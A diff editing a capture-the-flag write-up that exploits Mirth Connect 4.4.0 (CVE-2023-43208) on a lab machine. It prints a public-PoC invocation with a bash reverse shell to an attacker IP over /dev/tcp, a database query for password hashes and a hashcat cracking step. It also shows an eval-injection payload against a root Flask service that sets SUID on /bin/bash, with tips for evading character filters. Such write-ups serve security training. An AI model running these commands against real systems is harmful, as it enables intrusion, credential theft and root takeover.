@@ -17,7 +17,7 @@ tags: [linux, mirth-connect, cve-2023-43208, xstream, eval, hl7]
 
 ## TL;DR
 
-A healthcare integration platform: **Mirth Connect 4.4.0** with **CVE-2023-43208**, a pre-auth Java deserialization through XStream on `/api/users`. Shell as `mirth`; `mirth.properties` hands over MariaDB credentials, and a **PBKDF2-HMAC-SHA256** hash in the users table cracks and is reused over SSH. Root sits in a Flask service listening only on `127.0.0.1:54321` that evaluates an **f-string with `eval()`** over patient data.
+A healthcare integration platform: **Mirth Connect 4.4.0** with **CVE-2023-43208**, a pre-auth Java deserialization through XStream on `/api/users`. Shell as `mirth`; `mirth.properties` hands over MariaDB credentials, and a **PBKDF2-HMAC-SHA256** hash in `PERSON_PASSWORD` cracks and is reused over SSH. Root sits in a Flask service listening only on `127.0.0.1:54321` that evaluates an **f-string with `eval()`** over patient data.
 
 ## Recon
 
@@ -27,9 +27,9 @@ nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
 
 ```text
 22/tcp    ssh
-8080/tcp  http    Mirth Connect 4.4.0
-8443/tcp  https   Mirth Connect REST API
-6661/tcp  http    (internal interface)
+80/tcp    http    Mirth Connect 4.4.0 (redirects to HTTPS)
+443/tcp   https   Mirth Connect 4.4.0 / REST API
+6661/tcp  mllp    HL7 v2 listener of the internal channel
 ```
 
 ## Foothold: CVE-2023-43208
@@ -38,7 +38,7 @@ XStream deserializes `/api/users` XML with no class allowlist. With a public PoC
 
 ```bash
 git clone https://github.com/IHTeam-Sec/MirthRCE && cd MirthRCE
-python3 exploit.py -t https://<IP>:8443 \
+python3 exploit.py -t https://<IP> \
   -c "bash -c 'bash -i >& /dev/tcp/<IP>/4444 0>&1'"
 ```
 
@@ -63,15 +63,18 @@ database.password = <password>
 ```
 
 ```bash
-mysql -u mirth -p'<password>' mirthdb -e "select username, password from users;"
+mysql -u mirth -p'<password>' mirthdb \
+  -e "select PERSON_ID, PASSWORD from PERSON_PASSWORD where PERSON_ID=2;"
 ```
 
 ```text
-sedric | <PBKDF2-HMAC-SHA256 hash>
+sedric | <base64 PBKDF2-HMAC-SHA256 hash>
 ```
 
+The hash is `PBKDF2WithHmacSHA256` with **600,000 iterations**, an 8-byte salt and a 32-byte key, all base64; repack it into hashcat's form (`sha256:600000:<salt>:<key>`):
+
 ```bash
-hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 10900 'sha256:600000:<salt_b64>:<key_b64>' /usr/share/wordlists/rockyou.txt
 ssh sedric@<IP>
 ```
 
@@ -85,15 +88,15 @@ ss -ltnp | grep '127.0.0.1'
 127.0.0.1:54321  python3  notif.py
 ```
 
-The service runs as **root**, takes JSON with patient fields and builds its query through an f-string that reaches `eval()`. A controlled field becomes arbitrary execution:
+The service runs as **root** (`notif.py`, `root:sedric`, 2332 bytes), takes patient JSON and builds an **f-string** template that ends in `eval()`. The character allowlist permits braces, so the patient field injects the expression:
 
 ```bash
 curl -s http://127.0.0.1:54321/notify \
   -H 'Content-Type: application/json' \
-  -d '{"filter":"__import__('"'"'os'"'"').system('"'"'chmod +s /bin/bash'"'"')"}'
+  -d '{"firstname":"{__import__(\"os\").system(\"chmod +s /bin/bash\")}"}'
 ```
 
-If characters are filtered, encode the order (`chr()` or base64) and assemble the string inside `eval` itself.
+Spaces are usually filtered: base64-encode the order and decode it inside the expression (`__import__("base64").b64decode(...)`), assembling the string within `eval`.
 
 ```bash
 /bin/bash -p
